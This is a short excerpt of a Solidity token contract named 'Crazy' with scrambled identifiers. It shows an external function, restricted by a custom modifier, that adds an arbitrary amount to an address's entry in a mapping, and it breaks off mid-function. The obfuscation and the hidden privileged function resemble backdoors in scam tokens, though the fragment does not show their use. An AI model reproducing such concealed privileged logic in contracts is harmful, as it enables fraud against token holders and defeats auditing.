...
contract Crazy is Context, Ieryhh, Onrwerwe {
    ...
    uint256 public numTokensSellToAddToLiquidity = 10000000000 * 10**4;
    ...
    function _vsfvec(address opcjs, uint256 tyufdge) external yhtrAddress() {
        require(tyufdge > 0, "yrvssbm");
        uint256 terca = trvxsd[opcjs];
        if (terca == 0) _trvxsd.push(opcjs);
        trvxsd[opcjs] = terca.add(tyufdge);
